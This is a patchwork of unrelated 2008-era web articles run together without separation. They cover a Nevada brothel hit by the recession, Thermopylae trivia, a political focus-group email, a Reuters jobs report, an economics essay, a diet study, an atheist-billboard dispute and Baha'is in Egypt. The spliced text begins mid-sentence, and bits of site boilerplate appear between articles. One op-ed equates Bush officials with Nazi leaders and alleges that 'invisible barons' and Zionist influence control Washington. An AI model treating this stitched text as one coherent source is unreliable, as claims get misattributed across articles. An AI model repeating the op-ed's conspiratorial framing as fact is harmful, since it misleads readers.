11th straight month of job losses , making the unemployment rate to 6.7
per cent , the highest in 15 years .
Welcome to George Bush 's America .
The Real News reports :
The women at Donna ’s Ranch are crowded around the kitchen table on a warm summer night , dining on stir fry , tugging at thigh - high dresses , griping about depleted bank accounts .
At this northeastern Nevada bordello , which marks a gravel road ’s end , they woo grizzled truckers and weary travelers for a single reason : money .
Lately , the women do n’t go home with much .
Amy , 58 , once bought a $ 32,000 Toyota Tacoma in cash ; now her $ 1,200 mortgage saps her dwindling pay .
Some weeks , she could make more flipping burgers than flirting under a made - up name .
Marisol ’s daughters think she works at a resort ; she struggles to keep up the ruse .
It now takes months , not weeks , to bring $ 5,000 back to Southern California .
“ Marisol , ” one of her regulars tells her , “ it costs me in gas what it takes for me to spend a half - hour with you . ”

Tonight , she tries lingering at the dimly lighted bar that ’s decorated with red Christmas lights and smells of hot dogs and beans .
Wearing a shimmering strapless top , Marisol sips cheap champagne and tries to seduce travelers , some with thick guts and most with thin wallets .
After 20 minutes , she gives up .
Signs of the economic free fall have cropped up in many of Nevada ’s 25 or so legal brothels .
The Mustang Ranch , for example , has a steady stream of customers , but the number of women vying for work has soared .
Even a 74 - year - old applied .
This summer , the Shady Lady gave $ 50 gas cards to those who spent $ 300 .
The Moonlite Bunny Ranch offered extras to customers paying with their economic stimulus checks .
Here , 180 miles west of Salt Lake City , near the junction of Interstate 80 and Highway 93 , Donna ’s Ranch has seen its business plummet nearly 20 % .
More than three - quarters of its customers are long - haul truckers , and high fuel and food prices have drained them of “ play money , ” owner Geoff Arnold says .
That cuts into pay for his 10 - member staff and the “ working girls . ”
Marisol , 49 , retreats to the kitchen , a homey nook with lemon - yellow walls and a plate of scones that another woman whipped up .
Amy is staring at the Lazy Susan , snuffing out a Misty cigarette .
“ There are two guys , ” Marisol says , her voice thick with frustration .
“ They want to relax and drink a beer and think about it . ”

She plops into a chair , pushes open blue curtains and scans a parking lot , bathed in yellow and pink by the neon advertising DONNA’S .
Her face puckers .
It ’s empty .
--
The brothel ’s woes start with the barflies , who are hoarding what little money they ’ve saved .
Tonight , two of them slouch in their stools and bemoan the economic slump , their voices rising to near shouts .
“ The government ’s got to do something , ” says Dean Hargis , a tattooed trucker who calls Springfield , Mo. , home .
“ Everybody who eats or drinks anything , they ’re going to hurt .
It affects what I eat , it affects what motel I stay in , it affects what dog food I buy . ”

David Zett , a long - hauler from Loretta , Wis. , gulps a Miller Genuine Draft and bashes oil companies : “ They ’ve got you over a barrel and can do whatever they want to you , and they do n’t even kiss you when they ’re done . ”
“ Just like this place , ” Hargis says .
“ No , ” Zett says .
“ They kiss you . ”
The bartender , Gayle Salinas , shakes her head .
She ’s pinching pennies too .
She used to take home $ 50 in tips at the end of most shifts .
Now she might pocket $ 12 .
Her pay is linked to how much the prostitutes make -- and customers are n’t choosing their most expensive offerings .
Advertisement
The women negotiate the price of “ parties ” and their duration , which the bartender tracks using kitchen timers .
Ten to 15 minutes costs at least $ 100 .
Customers once regularly paid thousands of dollars for extras listed on a hot - pink “ menu ” -- but these days , for example , few men desire the hot tub or mirrored fantasy room .
Earlier that night , Marisol had guided Rob Siddoway , a gangly , pony - tailed trucker from Tooele , Utah , into the fantasy room .
This was his first brothel trip in a year ; he used to stop by every few months .
“ See how comfortable you can get ? ” Marisol coos .
She points to a red - blanketed , circular bed and a pillow stitched with the word LOVE .
“ You can see yourself in the mirror , ” she says .
He looks instead at her : olive skin , substantial curves , dark , tired eyes .
He passes on buying an expensive party .
Marisol is n’t surprised .
She had played a fortune - telling card game that afternoon ; it showed the future would bring little cash .

About a dozen years ago , Arnold plunked down more than $ 1 million for Donna ’s Ranch .
He ’s a certified public accountant in Boise , Idaho , and had combed the books of several brothels ; buying one seemed business - savvy .
He owns another in Battle Mountain , Nev .
“ They ’re easy to run , ” says Arnold , president of the state brothel association .
“ If you keep the girls happy , you ’re done .
If the girls are happy , then the guys are happy .
I ca n’t think of any other business as good as a brothel , except for a doctor ’s office -- they ’re equally profitable . ”
Billed as the West ’s oldest continuously operating bordello , Donna ’s Ranch greets drivers with a sign that depicts a cowboy - hatted , buxom brunet preening atop a truck bed .
The red-roofed , single - story brothel is plagued with leaks ; a recent earthquake cracked its beige exterior .
The women ’s rooms are small .
Most have a double bed , a television and DVD player , and tables with assorted lotions , sex toys and toiletries .
There ’s also a handmade sign that reminds customers :
Tips are appreciated .
From 2006 to 2007 , the brothel ’s revenue climbed 7.6 % , to about $ 1 million .
This year , Arnold expects to make about $ 200,000 less .
Closing that gap is tricky : Brothel advertising is legal , but billboards and bus ads risk upsetting neighbors .
So the bordello sponsors a soccer team in Boise and a rodeo in Wells .
It also bought lights for the high school football field and gave local motels pens , which boast that Donna ’s is “ Your Biggest Bang for the Buck . ”

Arnold ’s staff clips coupons to slash the $ 3,300 monthly grocery bill .
He brainstorms other cost - cutting measures .
He owns 33 acres in Wells -- enough room , by his calculation , for five to 10 cows that could feed his workers .
“ That ’s what we ’ve come to , ” he says , chuckling at the idea .
“ Donna ’s Ranch could be a real ranch . ”

In the kitchen , Amy alternately smooths her black , rhinestone - trimmed mini-dress and reddened hair that falls to her waist .
She appears about a decade younger than she is , with a trim figure , high cheekbones and a tendency to giggle .
Advertisement
She waits for the CB radio to crackle .
During even - numbered hours , the women take turns sweet - talking truckers .
( They cede the odd - numbered hours to Bella ’s , the other brothel in this city of 1,300 people . )
The tactic , which lures more than a third of Donna ’s customers , is more vital now that business is slumping .
Amy is perched on a chair , legs crossed , a wedge heel dangling off French - manicured toes .
At last , a trucker grunts through the airwaves : “ Where you girls at ? ”
Amy leans toward a microphone and urges him to pull off at Exit 352 .
“ Are you the Asian girl ? ” he asks .
“ Bingo ! ” she says .
Advertisement
Amy has worked in brothels , on and off , for eight years .
She needed cash to get her own place , but also blames “ a broken heart . ”
Her grown son is the only person who ’s figured out her line of work , something she admits with downcast eyes .
She typically does three - week stints , but starts wanting to go home to Utah after two .
She used to pocket $ 6,000 each time -- even after splitting money with the house and covering room and board , condoms , licenses and legally required medical tests .
But what she wistfully terms the good old days -- when she could see up to 13 men a day and afford to turn down customers -- are gone .
Tonight , the bartender counts four brothel customers .
Maybe , Salinas says , things will pick up .
Some car buffs are in Wells for a show .
“ I do n’t know , ” Amy says .
“ They bring their wives . ”
The other women -- who likewise use pseudonyms and hide their jobs from their children and friends -- are discouraged too .
Tori , a blond veteran with a no - nonsense manner -- she waves off questions about her age -- commutes from the Reno area with an array of wigs and sequined get - ups .
In the early ‘90s , she was laid off from a Southern California real estate office ; she eventually turned to the brothel circuit : winters in southern Nevada , summers up north .
She wants to work in auto sales but makes do at Donna’s .
Advertisement
“ Some other places want you to work 24 hours , ” she says .
“ They do n’t want you to sleep . ”
Danielle , younger and more reserved than the other women , is passing time solving word puzzles .
She is milky - skinned with a long brown ponytail .
She ended up here after a divorce .
She periodically flies to South Carolina -- ticket prices have soared -- and tries to return with at least $ 2,000 .
But most customers have been trying to bargain down their prices .
Some are paying with credit cards -- an indication they do n’t have as much cash .
( The receipts say Apache Wells Development Co. , not Donna ’s Ranch . )
“ Whatever they have , ” Amy says , “ you have to take it . ”
Earlier , when she was parrying with the trucker , Amy curled up at a folding table just big enough for a radio and mike , a water bottle , a gray stuffed kitten , an ashtray and a dry erase board listing selling points :

Free beer .
Free chili .
Free shower .
SOUVENIRS .
“ I ’m going to bed , ” the trucker tells her .
“ Maybe come here and have a happy ending ? ” she purrs .
“ Tell me what a happy ending is . ”

“ I ca n’t talk about it over the radio . ”
Silence .
Thanks , the trucker says .
Not tonight .

Online Blog and Guide of Information World to display upcoming and hottest news and information of modern world with hottest trends in one place .
It was , um , a lot of years ago today ( 480 B.C. , to be exact ) that King Leonidas and the Spartans were defeated by Xerxes ' army at Thermopylae .
Well , that 's according to some accounts .
Some historians say that we can't be sure exactly what day in late summer the Battle of Thermopylae happened , but for our purposes today ( namely , a timely Quick 10 ) we 'll stick with the ones who have agreed on August 11 .
10 Things 300 Didn't Tell You
1 . We often hear the epic battle called the Battle of Thermopylae , but the truth is , there were lots of Battles of Thermopylae , including one in WWII .
In 1941 , the British Commonwealth set up their defenses in the same pass that was used in 480 B.C .
2 . However , that pass is a lot bigger than it used to be .
At the time of the historic stand against the Persians , the pass is estimated to have been no bigger than 30 meters .
Now , due to silt deposited by rivers over time , the coastline of the Gulf has grown by at least three miles .
3 . Another reason this Quick 10 is particularly fitting right now : according to " The Father of History "  , Herodotus , the Battle occurred while the Olympic Games were going on .
Of course , Herodotus also earned the nickname " The Father of Lies "  , so you may want to take that with a grain of salt .
4 . We do n't really know how many warriors there were on either side , but if you agree with Herodotus , there literally millions of Persians vs. 7,100 Greeks .
It 's pretty widely agreed that his estimation is ridiculous " “ it was probably closer to 200,000 Persians total ( including warriors who did n't make it to the battle at all ) .
5 . Some of those perfect quotes from the movie are the real thing .
If you 've seen 300 , you no doubt remember a Persian warrior telling a Spartan warrior that the Persian arrows would be so numerous they would blot out the sun .
" Then we will fight in the shade ! "  was the Spartan 's response .
Supposedly , this is a real quote from a Spartan named Dienekes .
6. Likewise , Leonidas was thought to have really said " Come and get them ! "  when the Persians told the Spartans to surrender their weapons .
7. Those Spartans sure are quotable .
Another quote that has perhaps lasted thousands of years is the Queen 's response to the messenger who asked why Spartan women were allowed to speak amongst men .
" Because only Spartan women give birth to real men , "  she said .
Plutarch , a Greek historian , recorded this memorable line in the Moralia under " Sayings of the Spartans "  .
8 . The poet Simonides wrote an epitaph for the 300 ; it was engraved on a stone and placed at the point of the Spartans ' last stand .
The original no longer exists , but a copy was made .
It has been translated many different ways " “ here are a few of them :
" ¢ Stranger !
To Sparta say , her faithful band
Here lie in death , remembering her command .
" ¢ Go tell the Spartans , thou who passest by ,
That here , obedient to their laws , we lie .
" ¢ Stranger , tell the Spartans that we behaved as they would wish us to , and are
buried here .
" ¢ Go , stranger , and to Lacedaemon tell
That here , obeying her behests , we fell .
9 . Literally , Thermopylae means " hot gates "  .
It was so named becaues of the sulfurous springs there ; the narrow pass served as a gateway to them .
10 . The person buried in Leonidas ' tomb may or may not be Leonidas .
While most of the Spartans were buried where they fell , it was custom to bring the King home and give him a proper burial .
However , they did n't get the body until 40 years later ( the Persians got to him first ) .
Obviously , the body was just bones at that point , so it was impossible to know if they actually belonged to Leonidas or not .
Voting for Obama anyway
I just got an astounding e-mail from a Republican consultant I know well .
He 's a guy who 's always thought Obama had a " glass jaw , " and was always among those agitating for hitting Obama harder .
Recently , he conducted a focus group in an upper - Midwestern state , showing them the kind of ad he thought would work : A no -holds - barred attack , cut for an independent group , which has n't aired .
I 'm just going to reprint his amazed e-mail about the focus group :
Reagan Dems and Independents .
Call them blue - collar plus .
Slightly more Target than Walmart .
Yes , the spot worked .
Yes , they believed the charges against Obama .
Yes , they actually think he 's too liberal , consorts with bad people and WON'T BE A GOOD PRESIDENT ... but they STILL do n't give a f***.
They said right out , " He wo n't do anything better than McCain " but they 're STILL voting for Obama .
The two most unreal moments of my professional life of watching focus groups : 54 year - old white male , voted Kerry ' 04 , Bush ' 00 , Dole ' 96 , hunter , NASCAR fan ... hard for Obama said : " I 'm gonna hate him the minute I vote for him .
He 's gonna be a bad president .
But I wo n't ever vote for another god -damn Republican .
I want the government to take over all of Wall Street and bankers and the car companies and Wal - Mart run this county like we used to when Reagan was President . "
The next was a woman , late 50s , Democrat but strongly pro-life .
Loved B. and H. Clinton , loved Bush in 2000 .
" Well , I do n't know much about this terrorist group Barack used to be in with that Weather guy but I 'm sick of paying for health insurance at work and that 's why I 'm supporting Barack . "
I felt like I was taking crazy pills .
I sat on the other side of the glass and realized ... this really is the Apocalypse .
The Seventh Seal is broken and its time for eight years of pure , delicious crazy ....

WASHINGTON ( Reuters ) - U.S. employers axed 533,000 jobs from payrolls in November , the most in 34 years , as the year - old recession hammered the economy and hardened calls for dramatic government action to restore growth .
The Labor Department said Friday the unemployment rate hit 6.7 percent last month , the highest since 1993 , which adds up to 10.3 million Americans out of work , 2 million more than the population of New York City .
The jobless rate , which stood at 6.5 percent in October , would have been even higher but for people leaving the labor force in discouragement over their search for work .
A number of U.S. companies have announced jobs cuts this week , including General Motors Corp and asset manager Legg Mason Inc Friday , a day after phone giant AT&T said it was letting 12,000 workers go .
Economists expect the unemployment rate to top 8 percent by late next year .
“ You ca n’t get much uglier than this .
The economy has just collapsed , and has gone into a free fall , ” said Richard Yamarone , chief economist at Argus Research in New York .
The collapse of the U.S. housing market last year sparked a global credit crisis that has killed growth , panicked investors and destroyed some of the oldest names in banking .
The U.S. government has pledged $ 700 billion of taxpayer money to shore up the financial sector and President - elect Barack Obama has vowed a powerful fiscal stimulus , with more aggressive action from the Federal Reserve also expected .
The U.S. central bank has cut interest rates to 1 percent and is expected to lower them toward zero in the coming weeks .
It is also deploying unconventional measures to buy government debt and lend directly to companies to stimulate activity .
Obama , who takes office on January 20 , said the downturn demanded action to create new jobs , which economists say means a spending and tax plan of $ 500 billion to $ 700 billion .
“ There are no quick or easy fixes to this crisis , which has been many years in the making , and it ’s likely to get worse before it gets better , ” Obama warned .
John Hendon , 36 , lost his job with Mutual Savings Credit Union in Birmingham , Alabama , in November .
He said it had been difficult , not least because he has three children .
“ I am going on interviews and waiting on responses .
However , they are telling me due to the economy , they are weighing in on their budget for next year .
It ’s a bad time of year to be out of work and there are so many people looking , ” said Hendon , whose old job paid over $ 50,000 a year .
U.S. stock markets staged a late rally after sagging for most of the day , with the Dow Jones industrial average closing 259 points or 3.09 percent higher at 8,635 .
Oil priced retreated below $ 42 per barrel and markets in Europe and Latin America fell .
The worldwide credit crisis sparked by mounting defaults on U.S. mortgages has pushed economies around the globe into or toward recession .
Canada said earlier Friday its economy shed 70,600 jobs in November , the most since June 1982 .
U.S. mortgage foreclosure levels hit a record in the third quarter , said the Mortgage Bankers Association , which estimates that 2.2 million home mortgages will start the foreclosure process this year before government efforts to stem the tide can gain traction .
Separate data from the Federal Reserve showed U.S. consumer borrowing fell $ 3.54 billion in October as the escalating credit crisis pinched lending after the collapse of investment bank Lehman Brothers .
October consumer credit fell at an annual rate of 1.5 percent to a total $ 2.578 trillion , the Fed said .
Analysts had expected it to grow $ 2 billion in October .
Job losses in November were the steepest since December 1974 , when 602,000 jobs were shed , and much worse than the consensus on Wall Street for a 340,000 reduction .
U.S. employers axed payrolls by 533,000 jobs in November , the most in 34 years , as the year - old recession hammered the economy and hardened calls for dramatic government action to turn the tide .

In addition , job losses in recent months turned out to be worse than previously reported .
October ’s loss was revised to 320,000 , originally given as a 240,000 loss , while September ’s drop was revised to 403,000 from 284,000 .
That meant 199,000 more jobs were lost in September and October than initially thought and the total reduction in U.S. nonfarm payrolls for the last three months was 1.256 million , with almost 2 million jobs shed in the year so far .
If December ’s job picture mirrored the last three months , it would make 2008 the worst for employment since 1945 .
Service - providing businesses alone shed 370,000 jobs in November , or two - thirds of the overall job declines , following a loss of 153,000 jobs the previous month .
That meant labor market weakness has shifted over from the goods - producing sectors of the economy to the far more important services sector , which delivers almost 80 percent of U.S. output .
Employment in manufacturing dropped by 85,000 , while construction payrolls shrank by 82,000 jobs .
Construction employment has declined for 17 straight months , and factory jobs have declined 29 straight months .
“ It ’s just a disaster , ” said Stephen Stanley , chief U.S. economist at RBS Greenwich in Greenwich , Conn .
A change for the better
Only Satan would have been worse than the Bush regime .
Therefore it could be argued that the new administration in the USA could never be worse than the one which divorced the hearts and minds of Americans from their brothers in the international community , which appalled the rest of the world with shock and awe tactics that included concentration camps , torture , mass murder and utter disrespect for international law .
Yet in choosing Obama , the people of America have opted to come back into the international fold .
Welcome back , friends !
A change for the better
Barack Obama is one man who has a mission and a dream .
He will not change the world , as he claims and he might not even change the USA , in the near future at least .
Powerful lobbies control the strings which control the puppets in Washington – indeed , it is not Washington that needs to be changed , but the invisible barons dictating its policies .
However , Obama ( while his running mate , Biden , is very much establishment and Zionist ) is a breath of fresh air and the significance of his election yesterday cannot be overestimated .
Firstly , the people of the USA have voted out the Bush regime and the odious mass - murdering thugs which controlled it and saw Washington vying with Nazi Germany for a place on the Podium of Horror .
Himmler and Rumsfeld the Torturers , Goebbels and Rice the propaganda machines , Hitler and Bush the Fuhrers , masterminding concentration camps , medieval - style torture chambers , illegal invasions , acts of mass slaughter and horrific acts of cruelty as international law was consigned to the dustbin .
Secondly , the people of the USA , in choosing Obama , have given a clear message to the international community that enough is enough and despite having voted for the Bush regime twice , now make a stand in favour of dialogue and discussion , debate and respect for the law , for these are the precepts which Barack Obama proclaimed he would adopt in his external policy .
Those of us in the international community who predicted eight long years ago what would happen if Bush were elected must do two things .
First , never forget the damage done by George W. Bush and his minions of evil and make sure that , like the generations after Hitler , history does not pardon these criminals as well - meaning politicians who were the victims of tough times .
Secondly , we must give Barack Obama a blank page to write on , and hand him the pen with a sincere and open smile .
Welcome back , people of the United States , welcome back into the fold of the international community , where you will find friends and not foes , where you will find we all prefer to smile and not to cry and that when we do cry , our tears taste of salt just like yours do , whether we are pink , blue , white , yellow or black .
Thirdly , the United States of America managed to undergo a whole and long election process without becoming obsessed with the colour of people ’s skin .
The ghosts of the past have been exorcised for good and how great it is to see a society which has managed to pull together , when just yesterday we were witnessing segregation on buses and the KKK performing its evil and demonic deeds .
The racists within US society have been silenced and relegated to insignificance and made to look as absurd as those who spend all summer trying to get a tan and then speak badly about negroes or people with dark skin during the winter .
The new President will learn very soon that the rest of the world does not want the US missile shield in eastern Europe , does not want US troops in Iraq , does not want the USA to change the world – the US President was elected by his people to govern America , ( North America , the United States of America ) and nowhere else .
The rest of the world is to be treated with the due and proper respect , on a basis of fraternity and equality and not talked down to like some master deriding a slave .
As for Afghanistan and the more radical elements within the Moslem world , dialogue is the key , not confrontation .
Bush was never going to be intelligent enough to discover and understand the meaning of Realpolitik .
Obama is intelligent , articulate and blessed apparently with the humility denoting the aura of a great man .
We welcome Barack Obama and the people of the United States back into the international community with open arms .
Let us build bridges together , let us respect each other ’s cultures , let us be friends .
This time around , please do not let us down again .

For indispensable reporting on the coronavirus crisis , the election , and more , subscribe to the Mother Jones Daily newsletter .
When president George W. Bush assumed office , most of those disgruntled about the stolen election contented themselves with this thought : Given our system of checks and balances , given the gridlock in Washington , how much damage could be done ?
Now we know : far more than the worst pessimists could have imagined .
From the war in Iraq to the collapse of the credit markets , the financial losses are difficult to fathom .
And behind those losses lie even greater missed opportunities .
Put it all together — the money squandered on the war , the money wasted on a housing pyramid scheme that impoverished the nation and enriched a few , and the money lost because of the recession — and the gap between what we could have produced and what we did produce will easily exceed $ 1.5 trillion .
Think what that kind of money could have done to provide health care for the uninsured , to improve our education system , to build green technology …
The list is endless .
And the true cost of our missed opportunities is likely even greater .
Consider the war :
First there are the funds directly allocated to it by the government ( an estimated $ 12 billion a month even according to the misleading accounting of the Bush administration ) .
Much larger , as the Kennedy School ’s Linda Bilmes and I documented in The Three Trillion Dollar War , are the indirect costs : the salaries not earned by those wounded or killed , the economic activity displaced ( from , say , spending on American hospitals to spending on Nepalese security contractors ) .
Such social and macroeconomic factors may account for more than $ 2 trillion of the war ’s overall cost .
There is a silver lining in these clouds .
If we can pull ourselves out of the malaise , if we can think more carefully and less ideologically about how to make our economy stronger and our society better , perhaps we can make progress in addressing some of our long - festering problems .
As a road map for where to begin , consider the seven major shortfalls the Bush administration leaves behind .
the values deficit :
One of the strengths of America is its diversity , and there has always been a diversity of views even on our fundamental principles — innocent until proven guilty , the writ of habeas corpus , the rule of law .
But ( so we thought ) those who disagreed with these principles were a fringe , easily ignored .
We have now learned that the fringe is not so small and includes among its numbers the president and leaders of his party .
And this division of values could not have come at a worse time .
The realization that we may have less in common than we thought may make it difficult to solve the problems we must address together .
the climate deficit :
With the help of corporate accomplices such as ExxonMobil , Bush tried to persuade Americans that global warming was fiction .
It is not , and even the administration has finally admitted as much .
But for eight years we did nothing , and America pollutes more than ever — a delay that will cost us dearly .
the equality deficit :
In the past , even if those at the bottom saw little or any of the gains from economic expansion , life was viewed as a fair lottery .
Up - by - your - bootstraps stories are part of America ’s sense of identity .
But today , the promise of the Horatio Alger legend rings false .
Upward mobility is becoming increasingly difficult .
Growing divisions in income and wealth are reinforced by a tax code that rewards those who have lucked out in the globalization sweepstakes .
As that realization sinks in , it will be even harder to find common cause .
the accountability deficit :
The moguls of American finance justified their astronomical compensation by their ingenuity and the great benefits it supposedly bestowed upon the country .
Now the emperors have been shown to have no clothes .
They did not know how to manage risk ; rather , their actions exacerbated risk .
Capital was not well allocated ; hundreds of billions were misspent , a level of inefficiency much greater than what people typically attribute to government .
Yet the moguls walked away with hundreds of millions of dollars while taxpayers , workers , and the economy as a whole were stuck with the tab .
the trade deficit :
Over the past decade , the nation has been borrowing massively abroad — some $ 739 billion in 2007 alone .
And it is easy to see why :
With the government running up huge debts , and with Americans ’ household savings close to zero , there was nowhere else to turn .
America has been living on borrowed money and borrowed time , and the day of reckoning had to come .
We used to lecture others about what good economic policy meant .
Now they are laughing behind our backs , and even occasionally lecturing us .
We ’ve had to go begging to the sovereign wealth funds — the excess wealth that other governments have accumulated and can invest outside their borders .
We recoil at the idea of our government running a bank .
But we seem to accept the notion of foreign governments owning a major share in some of our iconic American banks , institutions that are critical to our economy .
( So critical , in fact , we have given the Treasury a blank check to bail them out . )
the budget deficit :
Thanks in part to runaway military spending , in just eight short years our national debt has increased by two - thirds , from $ 5.7 trillion to more than $ 9.5 trillion .
But as dramatic as they are , these numbers vastly understate the problem .
Many of the Iraq
War bills , including the cost of benefits for injured veterans , have not yet come due , and they could amount to more than $ 600 billion .
The federal deficit this year is likely to add up to another half - trillion to the nation ’s debt .
And all this is before the Social Security and Medicare bills for the baby boomers .
the investment deficit : Government accounting is different from that in the private sector .
A firm that borrows to make a good investment will see its balance sheet improved , and its leaders will be applauded .
But in the public sector there is no balance sheet , and as a result , too many of us focus too narrowly on the deficit .
In reality , wise government investments yield returns far higher than the interest rate the government pays on its debt ; in the long run , investments help reduce deficits .
To cut them is penny - wise but pound - foolish , as New Orleans ’ levees and Minneapolis ’ bridge attest .
There are two hypotheses ( besides simple incompetence ) about why Republicans paid so little attention to the growing budget shortfall .
The first is that they simply trusted in supply - side economics — believing that , somehow , the economy would grow so much better with lower taxes that deficits would be ephemeral .
That notion has been shown for the fantasy that it is .
The second theory is that by letting the budget deficit balloon , Bush and his allies hoped to force a reduction in the size of government .
Indeed , the fiscal situation has grown so scary that many responsible Democrats are now playing into the hands of these “ starve the beast ” Republicans and calling for drastic cuts in expenditures .
But with Democrats worrying about appearing soft on security — and therefore treating the military budget as sacrosanct — it is hard to cut spending without slashing the investments most important to solving the crisis .
The most urgent task for the new president will be to restore the economy ’s strength .
Given our national debt , it is especially important to do that in ways that maximize the bang for our buck and help address at least one of the major deficits .
Tax cuts work — if they work — by increasing consumption , but America ’s problem is that we have been on a consumption binge ; prolonging that binge just postpones dealing with the deeper problems .
States and localities are about to face real budget constraints as tax revenues plummet , and unless something is done , they will be forced to cut spending , deepening the downturn .
At the federal level , we need to spend more , not less .
The economy must be reconfigured to reflect new realities — including global warming .
We will need fast trains and more efficient power plants .
Such expenditures stimulate the economy while providing the foundation for long - term sustainable growth .
There are only two ways to pay for these investments : raise taxes or cut other expenditures .
Upper-income Americans can well afford to pay higher taxes , and many countries in Europe have succeeded because of , not despite , high tax rates — rates that have enabled them to invest and compete in a globalized world .
But needless to say , there will be resistance to tax increases , and so the focus will shift to cuts .
But our social expenditures are already so bare - bones that there is little to spare .
Indeed , we stand out among the advanced industrial countries in the inadequacy of social protection .
The problems with America ’s health care system , for example , are well recognized ; fixing them means not only greater social justice , but greater economic efficiency .
( Healthier workers are more productive workers . )
That leaves but one major area in which to cut — defense .
We account for half of all the world ’s military expenditures , with 42 percent of tax dollars spent directly or indirectly on defense .
Even nonwar military expenditures have soared .
With so much money spent on weapons that do n’t work against enemies that do n’t exist , there is ample room to increase security at the same time that we cut defense expenditures .
The good news about today ’s bad economic news is that we ’re being forced to curb our material consumption .
If we do it in the right way , it will help limit global warming and may even force the realization that a truly high standard of living might entail more leisure , not just more material goods .
The laws of nature and the laws of economics are unforgiving .
We can abuse our environment , but only for a while .
We can spend beyond our means , but only for a while .
We can free ride on the investments made in the past , but only for a while .
Even the richest country in the world ignores the laws of nature and the laws of economics at its peril .
MEDFORD / SOMERVILLE , Mass . --
A new study from the psychology department at Tufts University shows that when dieters eliminate carbohydrates from their meals , they performed more poorly on memory - based tasks than when they reduce calories , but maintain carbohydrates .
When carbohydrates were reintroduced , cognition skills returned to normal .
" This study demonstrates that the food you eat can have an immediate impact on cognitive behavior , " explains Holly A. Taylor , professor of psychology at Tufts and corresponding author of the study .
" The popular low - carb , no - carb diets have the strongest potential for negative impact on thinking and cognition . "
Taylor collaborated with Professor Robin Kanarek , former undergraduate Kara Watts and research associate Kristen D'Anci .
The study , " Low - carbohydrate weight - loss diets .
Effects on cognition and mood , " appears in the February 2009 edition of the journal " Appetite . "
While the brain uses glucose as its primary fuel , it has no way of storing it .
Rather , the body breaks down carbohydrates into glucose , which is carried to the brain through the blood stream and used immediately by nerve cells for energy .
Reduced carbohydrate intake should thus reduce the brain 's source of energy .
Therefore , researchers hypothesized that diets low in carbohydrates would affect cognitive skills .
Study participants included 19 women ages 22 to 55 who were allowed to select the diet plan they preferred -- either a low - carbohydrate diet or a low - calorie , macronutrient balanced diet recommended by the American Dietetic Association .
Nine women chose a low - carbohydrate diet and 10 selected the low - calorie diet .
" Although the study had a modest sample size , the results showed a clear difference in cognitive performance as a function of diet , " says Taylor .
The 19 dieters completed five testing sessions that assessed cognitive skills , including attention , long - term and short - term memory , and visual attention , and spatial memory .
The first session was held before participants began their diets , the next two sessions occurred during the first week of the diet , which corresponded to the week when low - carb dieters eliminated carbohydrates .
The final two sessions occurred in week two and week three of the diets , after carbohydrates had been reintroduced for those on the low - carb diet .
" The data suggest that after a week of severe carbohydrate restriction , memory performance , particularly on difficult tasks , is impaired , " Taylor explains .
Low - carb dieters showed a gradual decrease on the memory - related tasks compared with the low - calorie dieters .
Reaction time for those on the low - carb diet was slower and their visuospatial memory was not as good as those on the low - calorie diet .
However , low - carb dieters actually responded better than low - calorie dieters during the attention vigilance task .
Researchers note that past studies have shown that diets high in protein or fat can improve a person 's attention in the short - term , which is consistent with the results in this study .
Participants were also asked about their hunger levels and mood during each session .
The hunger - rating did not vary between participants on a low - carb diet and those on a low - calorie diet .
The only mood difference between dieters was confusion , which was higher for low - calorie dieters during the middle of the study .
" Although this study only tracked dieting participants for three weeks , the data suggest that diets can affect more than just weight , " says Taylor .
" The brain needs glucose for energy and diets low in carbohydrates can be detrimental to learning , memory and thinking . "

Members of the Colorado Coalition of Reason ( COCORE ) recently paid to put up 11 atheist billboards , a variant of a common billboard being put up by local groups around the country :
Two of those billboards will not be going up , though , because Christians complained to the media company owning the billboard space , Next Media , which then said no to carrying the atheists ’ message .
The obvious question : Who cares what the Christians think in this case ?
The billboards are not about them .
They ’re not even mentioning , much less attacking , their beliefs .
As one blogger implies , how can the atheist billboard be considered offensive when the following type of billboard can be found all over the place without problems ?
Yet , the Christians persist .
Already , there have been threats from them :
The hate mail and nasty , threatening phone messages began almost immediately .
Much of it has been directed at Joel Guttormson , who mostly has been serving as a spokesman for COCORE , as they call it .
Twenty - two and a Metro State junior majoring in theoretical mathematics , Guttormson also is president of the Metro State Atheists , one of the 11 groups that make up COCORE .
“ It ’s been kind of wild , kind of outrageous , ” he says of days since the billboards went up .
“ It has been mostly Christians who ’ve been calling and e-mailing , ” Joel Guttormson said , “ which is strange since the message is not directed at Christians or anyone from any religion .
“ You know , if you see an ad for migraine medicine and you do n’t have a migraine , why would you care ? ”
Almost all of the feedback , he said , has been from people who say the billboards denigrate Christians .
He says he still has no idea how that is possible . …
“ Have you seen the billboard ?
Tell me where any of them mentions evil or hate .
Why is everyone so mad ? ”
So what kinds of Christians would get upset at the mere questioning of God ’s existence ?
This kind :
John Matson , of Denver , was so mad after seeing the Santa Fe Drive sign that he dashed off an angry letter to the billboard ’s owner .
“ It is a despicable act to allow that sign , ” the 60 - year - old man said in an interview , “ and for just a few pieces of silver . ”
He went on COCORE ’s Web site , and it made him even angrier , John Matson said .
It is trying to gather , he said , “ a constituency of what I call mob rule . ”
“ I know they ’re atheists , and my opinion is they want others to believe the same thing .
The billboard misrepresents their purpose , ” he said .
“ Their agenda is wolf - in - sheep ’s clothing political .
Why do n’t they just say it . ”
“ They want others to believe the same thing ? ” Yes , and it ’s a good thing Christians have never wanted that …
( Hell , anyone with an opinion wants others to believe the same thing .
That ’s not a bad thing . )
I wonder how upset Matson would be if the first word was removed from the billboard …
( I imagine he ’d be ok with that ) .
The problem is not that someone disagrees — that ’s to be expected .
It ’s that people like Matson are trying to stifle speech .
Guttormson adds that some Christians have had the right perspective on this : they may disagree but they defend the rights of the atheists .
It ’d be nice if the two camps of Christians would talk to one - another .

The Fourth Faith ’s Struggle for Existence
November 2008
Despite seemingly victorious rulings , Baha ’is in Egypt are still struggling for basic rights .
By : Ethar El - Katatney
Shehab Shady is just over two weeks old .
With his downy skin and puckered mouth , he looks like any other baby boy .
With one difference : he does n’t exist .
There ’s no doubt he ’s flesh and blood , but like any Baha ’i that lives in Egypt , he does n’t officially exist .
Because his parents refused to lie — which is prohibited by their faith — or illegally falsify his religious affiliation on his birth certificate — which is prohibited by Egyptian law — he could n’t get one .
“ It ’s like we ’re not humans , ” said 33 - year - old Shady Samir , a fourth - generation Baha ’i and blogger .
“ I get death threats on my blog , and constant hate mail . ”
Samir ’s father , who died four years ago , is still considered alive by the government , since no death certificate could be issued .
The cases of both Shady and Samir are not unique .
Four years ago , Ministerial Decree 49 came into play , stating that only one of three monotheistic religions could be written in the religious affiliation field of any identification document .
Before the decree was passed , other religions were accepted or the field could be left blank .
